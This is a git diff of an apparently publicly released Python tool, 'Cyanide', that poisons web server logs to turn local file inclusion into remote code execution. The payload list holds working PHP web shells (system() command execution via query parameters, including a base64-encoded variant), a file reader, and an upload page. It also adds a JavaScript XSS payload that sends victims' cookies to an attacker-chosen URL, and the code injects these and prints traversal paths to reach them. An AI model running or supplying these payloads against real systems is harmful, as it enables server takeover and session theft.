@@ -4,12 +4,27 @@ import argparse
 from colorama import init, Fore, Style
 init(convert=True)
 
+VERSION = "V1.2.0"
 
-PAYLOADS = {
-    "PHPCMD": ("<?php echo(isset($_GET['c']))?system($_GET['c']):'Usage: ?c=COMMAND'; ?>", "PHP Simple Command Injection", "[PHP] Simple command injection with query variable 'c'. Ex.: ?c=ls"),
-    "PHPB64CMD": ("<?php echo(isset($_GET['b']))?system(urldecode(base64_decode($_GET['b']))):'Usage: ?b=B64_COMMAND'; ?>", "PHP Simple Base64 Command Injection", "[PHP] Simple command injection with query variable 'b', but the command is base64 and URL encoded. Ex.: ?b=bHM%3D"),
-    "PHPREADFILE": ("<?php echo(isset($_GET['f']))?('<code><pre>'.htmlentities(file_get_contents($_GET['f'])).'</pre></code>'):'Usage: ?f=FILENAME'; ?>", "PHP File Reader", "[PHP] Read a file's contents. Using parameter 'f' to specificy a filename. Ex.: ?f=filename.ext")
-}
+class Payload():
+    def __init__(self, id, name, code, argcount, desc, usage):
+        self.id = id
+        self.name = name
+        self.code = code
+        self.desc = desc
+        self.usage = usage
+        self.argcount = argcount
+
+    def build(self, args):
+        if len(args) == self.argcount:
+            self.code = self.code % tuple(args)
+        else:
+            throwProgramError("PAYLOAD BUILDING ERROR",
+                              f"Payload {self.id} necessitates {self.argcount} arguments!")
+
+    def __str__(self):
+        return f"{CODES['HELP']} {self.id} (min. {len(self.code)} chars, necessitates {self.argcount} args) -> {self.name}: {self.desc} Usage: {self.usage}"
+
 
 CODES = {
     "INFO": Fore.MAGENTA + "[i]" + Style.RESET_ALL,
@@ -18,6 +33,31 @@ CODES = {
     "SUC": Fore.CYAN + "[*]" + Style.RESET_ALL,
     "PROB": Fore.YELLOW + "[*?]" + Style.RESET_ALL
 }
+
+PAYLOADS = [
+    Payload("PHPCMD", "PHP Simple Command Injection",
+            "<?php echo(isset($_GET['c']))?system($_GET['c']):'Usage: ?c=COMMAND'; ?>", 0, "[PHP] Simple command injection with query variable 'c'.", "Ex.: ?c=ls"),
+    Payload("PHPB64CMD", "PHP Simple Base64 Command Injection", "<?php echo(isset($_GET['b']))?system(urldecode(base64_decode($_GET['b']))):'Usage: ?b=B64_COMMAND'; ?>",
+            0, "[PHP] Simple command injection with query variable 'b', but the command is base64 and URL encoded.", "Ex.: ?b=bHM%3D"),
+    Payload("PHPREADFILE", "PHP File Reader", "<?php echo(isset($_GET['f']))?('<code><pre>'.htmlentities(file_get_contents($_GET['f'])).'</pre></code>'):'Usage: ?f=FILENAME'; ?>",
+            0, "[PHP] Read a file's contents. Using parameter 'f' to specificy a filename.", "Ex.: ?f=filename.ext"),
+
+    Payload("PHPUPLOAD", "PHP Simple File Upload", "<form action=''enctype='multipart/form-data'method='POST'><input type='file'name='u'><input type='submit'value='Upload'></form><?php if(!empty($_FILES['u'])){if(move_uploaded_file($_FILES['u']['tmp_name'],basename($_FILES['u']['name']))){echo '<b>Upload successful.</b>';}else{echo '<b>There was a problem, try again!</b>';}} ?>", 0, "[PHP] Simple file upload page to pop in the logs.", "You should find a typical file upload section in the logs."),
+    Payload("JSCOOKIEXSS", "JavaScript Simple XSS Cookie Stealer", "<script type='text/javascript'>document.location='%s'+encodeURIComponent(btoa(document.cookie))</script>", 1, "[JS] Simple XSS Cookie Stealer. Needs one argument being the link to send a request with the cookies to.", "Specify the URL after choosing the payload. Ex.: -pl JSCOOKIEXSS http://myurl.com/")
+]
+
+
+def getPayloadById(payloadid):
+    for p in PAYLOADS:
+        if p.id == payloadid:
+            return p
+
+    throwProgramError("UNKNOWN PAYLOAD ID", payloadid + "!")
+
+
+def throwProgramError(type, excerpt, doExit=True):
+    print(f"{CODES['ERR']} {type}: {excerpt}")
+    if doExit: exit()
 
 
 def banner():
@@ -30,7 +70,7 @@ def banner():
    \\|_______|/\\_____/      \\/__/\\/__/\\/__/ \\/__/\\/__/\\/_______//________/
 =============\\/____/=======================================================
 {CODES["INFO"]} Cyanide: Log Poisoner (LFI to RCE)
-{CODES["INFO"]} Version: 1.0.0
+{CODES["INFO"]} Version: {VERSION}
 {CODES["INFO"]} Author: Noxtal
 {CODES["INFO"]} Website: https://noxtal.com
 {CODES["INFO"]} BadByte Official Program (https://discord.gg/CDACNFg)
@@ -39,15 +79,8 @@ def banner():
 
 def print_payloads():
     print(f"{CODES['HELP']} AVAILABLE PAYLOADS")
-    i = 0
-    for payload in PAYLOADS.items():
-        name = payload[0]
-        data = payload[1]
-        payl = data[0]
-        shortname = data[1]
-        desc = data[2]
-        print(f"{Fore.GREEN}[{i}]{Style.RESET_ALL} {name} ({len(payl)} chars) -> {shortname}: {desc}")
-        i += 1
+    for p in PAYLOADS:
+        print(p)
 
 
 def poison(url, payload, method="GET", parameter="page", encode_lvl=0, prefix="", suffix=""):
@@ -85,7 +118,7 @@ Access your payload using one of the following URLs:
 - {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}nostromo{slash}logs{slash}access_log{suffix}
               """)
     except requests.exceptions.HTTPError as e:
-        print(f"{CODES['ERR']} HTTP ERROR:", e)
+        throwProgramError("HTTP ERROR", e, doExit=False)
         print(f"""
 {CODES["PROB"]} ERROR LOGS PROBABLY POISONED.
 Try to access your payload using one of the following URLs:
@@ -107,20 +140,21 @@ Try to access your payload using one of the following URLs:
 - [404 only] {url}?{parameter}={prefix}{(dot+dot+slash)*10}var{slash}nostromo{slash}logs{slash}access_log{suffix}
               """)
     except requests.exceptions.ConnectionError as e:
-        print(f"{CODES['ERR']} CONNECTION ERROR: ", e)
+        throwProgramError("CONNECTION ERROR", e)
     except requests.exceptions.Timeout as e:
-        print(f"{CODES['ERR']} TIMEOUT ERROR: ", e)
+        throwProgramError("TIMEOUT ERROR", e)
     except requests.exceptions.RequestException as e:
-        print(f"{CODES['ERR']} UNEXPECTED ERROR: ", e)
+        throwProgramError("UNEXPECTED ERROR", e)
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description=f"Log poisoner. Turns a Local File Inclusion to a Remote Code Execution. Counts {len(PAYLOADS.keys())} different payloads for now.")
+    parser = argparse.ArgumentParser(
+        description=f"Log poisoner. Turns a Local File Inclusion to a Remote Code Execution. Counts {len(PAYLOADS)} different payloads for now.")
     parser.add_argument("-q", "--quiet", "--no-banner", action="store_true",
                         help="Quiet mode. No banner.")
     parser.add_argument("-Pl", "--payloads", "--list", action="store_true",
                         help="List all possible payloads.")
-    parser.add_argument("-pl", "--payload", "--set-payload",
+    parser.add_argument("-pl", "--payload", "--set-payload", nargs="*",
                         help="Set payload (by index or ID). Use -Pl to list available payloads.")
     parser.add_argument("-m", "--method", type=str,
                         help="HTTP request method. Ex.: POST")
@@ -141,6 +175,8 @@ if __name__ == "__main__":
 
     if not args.quiet:
         banner()
+    else:
+        print(f"{CODES['INFO']} Cyanide {VERSION} by Noxtal")
 
     if args.payloads:
         print_payloads()
@@ -155,25 +191,28 @@ if __name__ == "__main__":
 
             payload = None
             if args.payload == None:
-                payload = PAYLOADS["PHPCMD"]
+                payload = getPayloadById("PHPCMD")
             else:
-                if str.isnumeric(args.payload):
-                    payload = PAYLOADS[list(PAYLOADS.keys())[int(args.payload)]]
+                if str.isnumeric(args.payload[0]):
+                    try:
+                        payload = PAYLOADS[int(args.payload[0])]
+                    except IndexError as e:
+                        throwProgramError(
+                            "PAYLOAD INDEX OUT OF RANGE ERROR", e)
                 else:
-                    if args.payload in PAYLOADS.keys():
-                        payload = PAYLOADS[args.payload]
-                    else:
-                        print(
-                            f"{CODES['ERR']} UNKNOWN PAYLOAD NAME OR INDEX '{args.payload}'!")
-            print(f"{CODES['SUC']} SELECTED PAYLOAD: {payload[1]}")
+                    payload = getPayloadById(args.payload[0])
+                payload.build(args.payload[1:])
+
+            print(f"{CODES['SUC']} SELECTED PAYLOAD: {payload.name}")
 
             method = args.method if args.method != None else "GET"
             parameter = args.par if args.par != None else "page"
             prefix = args.prefix if args.prefix != None else ""
             suffix = args.suffix if args.suffix != None else ""
 
-            poison(args.URL, payload[0], method,
-                parameter, encode_lvl, prefix, suffix)
+            poison(args.URL, payload.code, method,
+                   parameter, encode_lvl, prefix, suffix)
         else:
-            print(f"{CODES['ERR']} PARSING ERROR: -u <URL> is required for this action.")
+            throwProgramError(
+                "PARSING ERROR", "-u <URL> is required for this action!")
             parser.print_usage()
